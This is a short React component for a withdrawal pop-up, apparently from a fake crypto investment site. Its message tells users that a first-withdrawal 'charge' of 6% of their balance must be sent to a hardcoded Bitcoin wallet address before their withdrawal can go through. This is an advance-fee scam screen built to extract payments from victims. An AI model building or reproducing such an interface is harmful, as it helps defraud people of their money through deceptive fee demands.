import {HiShieldCheck, HiWallet} from 'react-icons/hi2'
import { formatCurrency } from '../utils/helpers';

const WithdrawalPop = ({amount}) => {
    return ( 
        <div className="grid grid-cols-1 gap-y-4 p-4 justify-center">
            <div className='flex justify-center w-full'>
                <HiShieldCheck className='text-center' size={30} color='green'/>
            </div>
            
            <h4 className='text-slate-100 font-bold text-center'>A specific withdrawal charge is assigned to each user during their first withdrawal. Kindly ensure to submit the precise sum to the company's address and attempt the transaction again.</h4>

            <span className='text-white flex flex-col text-center gap-x-4'>
                <small className='flex items-center gap-x-2 text-slate-400'>Amount</small>  
                <small className='text-[15px] text-slate-100'>{formatCurrency((amount * 6) / 100)}</small>
            </span>
            <span className='text-white flex flex-col text-center gap-x-4'>
                <small className='flex items-center gap-x-2 text-slate-400'><HiWallet/> wallet </small>  
                <small className='text-[12px] text-green-500'>35Hd5tza5Nh9S5hQbHa85HTV6a7EqnbzgS</small>
            </span>
        </div>
     );
}
 
export default WithdrawalPop;